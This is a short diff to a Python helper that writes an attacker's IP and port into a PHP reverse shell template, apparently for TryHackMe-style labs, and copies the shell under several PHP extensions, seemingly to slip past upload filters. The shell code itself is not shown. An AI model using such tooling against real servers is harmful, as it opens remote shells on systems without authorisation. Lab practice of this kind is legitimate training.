@@ -13,10 +13,8 @@ def main(args):
     # replace the ip and port with what was provided
     with open(base_filename, 'r') as fp:
         text = fp.read()
-    text = text.replace("$ip = 'PUT_THM_ATTACKBOX_IP_HERE';  // CHANGE THIS",
-                              f"$ip = '{args.host}';  // CHANGE THIS")
-    text = text.replace("$port = 1234;       // CHANGE THIS",
-                              f"$port = {args.port};       // CHANGE THIS")
+    text = text.replace("$ip = 'PUT_THM_ATTACKBOX_IP_HERE';  // CHANGE THIS", f"$ip = '{args.host}';")
+    text = text.replace("$port = 1234;       // CHANGE THIS", f"$port = {args.port};")
     with open(base_filename, 'w') as fp:
         fp.write(text)
     # duplicate shell using different php extensions
